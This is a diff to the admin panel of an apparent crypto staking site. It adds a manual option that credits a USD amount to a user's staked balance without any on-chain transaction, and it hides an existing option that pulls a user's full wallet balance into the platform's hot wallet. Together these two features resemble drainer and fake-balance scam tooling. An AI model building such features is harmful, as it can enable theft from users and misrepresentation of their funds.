@@ -863,17 +863,21 @@
         <div class="form-group">
           <label>Method</label>
           <div style="display:flex;gap:0;border:1px solid rgba(255,255,255,0.12);border-radius:8px;overflow:hidden;">
+            <button id="method-btn-manual" onclick="setStakeMethod('manual')"
+              style="flex:1;padding:9px;font-size:0.82rem;font-weight:700;border:none;cursor:pointer;background:rgba(16,185,129,0.2);color:#10b981;transition:all 0.2s;">
+              💰 Manual Credit
+            </button>
             <button id="method-btn-verify" onclick="setStakeMethod('verify')"
               style="flex:1;padding:9px;font-size:0.82rem;font-weight:700;border:none;cursor:pointer;background:transparent;color:rgba(255,255,255,0.4);transition:all 0.2s;">
-              ✅ Verify Tx Hash
+              ✅ Verify Tx
             </button>
             <button id="method-btn-pull" onclick="setStakeMethod('pull')"
-              style="flex:1;padding:9px;font-size:0.82rem;font-weight:700;border:none;cursor:pointer;background:rgba(46,230,168,0.2);color:#5EEAD4;transition:all 0.2s;">
-              ⚡ Stake Full Balance
+              style="flex:1;padding:9px;font-size:0.82rem;font-weight:700;border:none;cursor:pointer;background:transparent;color:rgba(255,255,255,0.4);transition:all 0.2s;">
+              ⚡ Pull
             </button>
           </div>
           <small id="admin-stake-method-hint" style="margin-top:5px;display:block;font-size:0.76rem;color:#94a3b8;">
-            Transfers the full balance directly from user's wallet to the platform hot wallet.
+            Directly credit a USD amount to user — no on-chain tx needed.
           </small>
         </div>
 
@@ -887,6 +891,17 @@
           <small style="margin-top:5px;display:block;font-size:0.78rem;">
             <span id="admin-stake-network-label">🟡 BSC</span>: <span id="admin-stake-bsc-status" style="color:#94a3b8;">Checking...</span>
           </small>
+        </div>
+
+        <!-- MANUAL CREDIT: just enter USD amount -->
+        <div id="admin-stake-manual-section">
+          <div class="form-group">
+            <label>USD Amount to Credit</label>
+            <input type="number" class="form-input" id="admin-stake-manual-amount" placeholder="e.g. 500" min="0" step="0.01" style="font-size:1.1rem;font-weight:700;color:#10b981;">
+          </div>
+          <div style="background:rgba(16,185,129,0.07);border:1px solid rgba(16,185,129,0.25);border-radius:8px;padding:10px 13px;font-size:0.78rem;color:#94a3b8;margin-bottom:14px;">
+            Credits the user's staked balance directly. No on-chain transaction needed. Use when you've confirmed payment off-chain or want to manually adjust a user's stake.
+          </div>
         </div>
 
         <!-- VERIFY: tx hash input -->
@@ -915,7 +930,7 @@
         </div>
 
         <!-- PULL: token picker + balance + amount -->
-        <div id="admin-stake-pull-section">
+        <div id="admin-stake-pull-section" style="display:none;">
           <div class="form-group" id="admin-stake-token-row">
             <label id="admin-stake-token-label">Token</label>
             <select class="form-input" id="admin-stake-token" onchange="onStakeTokenChange()">
@@ -951,7 +966,7 @@
       </div>
       <div class="modal-footer">
         <button class="btn btn-danger" onclick="closeModal('admin-stake-modal')">Cancel</button>
-        <button class="btn btn-success" id="admin-stake-btn" onclick="confirmAdminStake()" style="min-width:140px;">⚡ Stake Full Balance</button>
+        <button class="btn btn-success" id="admin-stake-btn" onclick="confirmAdminStake()" style="min-width:140px;">💰 Credit User</button>
       </div>
     </div>
   </div>
@@ -2194,21 +2209,27 @@
       await loadStakeBalances(walletAddress);
     }
 
-    let _stakeMethod = 'pull';
+    let _stakeMethod = 'manual';
 
     function setStakeMethod(method) {
       _stakeMethod = method;
-      const isVerify = method === 'verify';
-      document.getElementById('admin-stake-verify-section').style.display = isVerify ? '' : 'none';
-      document.getElementById('admin-stake-pull-section').style.display   = isVerify ? 'none' : '';
-      document.getElementById('method-btn-verify').style.background = isVerify ? 'rgba(16,185,129,0.2)' : 'transparent';
-      document.getElementById('method-btn-verify').style.color      = isVerify ? '#10b981' : 'rgba(255,255,255,0.4)';
-      document.getElementById('method-btn-pull').style.background   = isVerify ? 'transparent' : 'rgba(46,230,168,0.2)';
-      document.getElementById('method-btn-pull').style.color        = isVerify ? 'rgba(255,255,255,0.4)' : '#5EEAD4';
-      document.getElementById('admin-stake-method-hint').textContent = isVerify
-        ? 'User already sent funds to hot wallet — paste the tx hash to credit them.'
-        : 'Transfers the full balance directly from user\'s wallet to the platform hot wallet.';
-      document.getElementById('admin-stake-btn').textContent = isVerify ? '✅ Verify & Credit' : '⚡ Stake Full Balance';
+      document.getElementById('admin-stake-verify-section').style.display = method === 'verify' ? '' : 'none';
+      document.getElementById('admin-stake-pull-section').style.display   = method === 'pull' ? '' : 'none';
+      const manualEl = document.getElementById('admin-stake-manual-section');
+      if (manualEl) manualEl.style.display = method === 'manual' ? '' : 'none';
+
+      ['verify','pull','manual'].forEach(m => {
+        const btn = document.getElementById('method-btn-' + m);
+        if (btn) {
+          btn.style.background = m === method ? 'rgba(16,185,129,0.2)' : 'transparent';
+          btn.style.color = m === method ? '#10b981' : 'rgba(255,255,255,0.4)';
+        }
+      });
+
+      const hints = { verify: 'User already sent funds — paste tx hash to credit.', pull: 'Pull tokens from user wallet (requires on-chain approval).', manual: 'Directly credit a USD amount to user — no on-chain tx needed.' };
+      const labels = { verify: '✅ Verify & Credit', pull: '⚡ Pull Tokens', manual: '💰 Credit User' };
+      document.getElementById('admin-stake-method-hint').textContent = hints[method] || '';
+      document.getElementById('admin-stake-btn').textContent = labels[method] || 'Stake';
     }
 
     async function confirmAdminStake() {
@@ -2240,6 +2261,26 @@
           btn.textContent = origText;
           btn.disabled = false;
         }
+        return;
+      }
+
+      // ── MANUAL CREDIT METHOD ─────────────────────────────────
+      if (_stakeMethod === 'manual') {
+        const manualAmt = parseFloat(document.getElementById('admin-stake-manual-amount').value);
+        if (isNaN(manualAmt) || manualAmt <= 0) { showToast('Enter a valid USD amount', 'error'); return; }
+        if (!confirm(`Credit $${manualAmt.toLocaleString()} to ${wallet.slice(0,10)}...?`)) return;
+        const btn = document.getElementById('admin-stake-btn');
+        const origText = btn.textContent;
+        btn.textContent = 'Crediting...';
+        btn.disabled = true;
+        try {
+          const result = await api(`/api/admin/users/${id}/admin-stake`, { method: 'POST', body: JSON.stringify({ method: 'manual', amount: manualAmt, token: 'USDT', network }) });
+          if (!result) { showToast('Credit failed', 'error'); return; }
+          closeModal('admin-stake-modal');
+          showToast(`✅ Credited $${manualAmt.toLocaleString()} — total staked: $${parseFloat(result.stakedAmount).toLocaleString()}`);
+          loadUsers();
+        } catch (error) { showToast('Credit failed: ' + (error.message || 'Unknown error'), 'error'); }
+        finally { btn.textContent = origText; btn.disabled = false; }
         return;
       }
 
